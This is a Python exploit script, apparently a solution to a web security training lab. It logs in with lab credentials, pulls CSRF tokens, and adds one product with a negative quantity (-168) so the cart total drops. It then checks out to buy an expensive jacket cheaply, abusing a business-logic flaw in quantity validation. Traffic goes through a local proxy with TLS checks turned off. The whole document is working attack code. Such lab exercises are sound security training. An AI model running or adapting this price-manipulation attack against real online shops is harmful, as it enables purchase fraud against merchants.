import sys
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def main():
    if len(sys.argv) != 2:
        print("⚠️  Usage: %s <url>" % sys.argv[0])
        print("⚠️  Example: %s www.example.com " % sys.argv[0])
    else:
        session = requests.Session()
        url = remove_trailing_slash(sys.argv[1])
        exploit_business_logic_vulnerability(url,session)

def exploit_business_logic_vulnerability(url,session):
    token = get_csrf_token(url,session)
    login_request(url,session,token)
    add_to_cart(url,session,1,1)
    add_to_cart(url,session,3,-168)
    token = get_csrf_token(url,session)
    checkout(url,session,token)

def get_csrf_token(url,session):
    response = session.get(url+"/login",verify=False,proxies=proxies)
    soup = BeautifulSoup(response.text,"html.parser")
    csrf_token = soup.find("input",{"name":"csrf"})["value"]
    return csrf_token

def login_request(url,session,csrfToken):
    payload = {"csrf":csrfToken,"username":"wiener","password":"peter"}
    r = session.post(url+'/login',payload,verify=False,proxies=proxies)
    if 'Log out' in r.text:
        print('✅ Successfully logged in.')
    else:
        print("❌ Error logging in.")
        sys.exit(-1)

def add_to_cart(url,session,productId,quantity):
    payload = {"productId":productId,"redir":"PRODUCT","quantity":quantity}
    session.post(url+"/cart",payload,verify=False,proxies=proxies)


def checkout(url,session,csrf):
    payload = {"csrf":csrf}
    r = session.post(url +"/cart/checkout",payload,verify=False,proxies=proxies)
    if "Congratulations" in r.text:
        print('✅ Purchased Lightweight "l33t" Leather Jacket.')
        print("✅ Successfully exploited vulnerability.")
    else:
        print("❌ Error exploiting vulnerability.")

def remove_trailing_slash(url):
    if url.endswith("/"):
        return url[:-1]
    return url

if __name__ == "__main__":
    main()


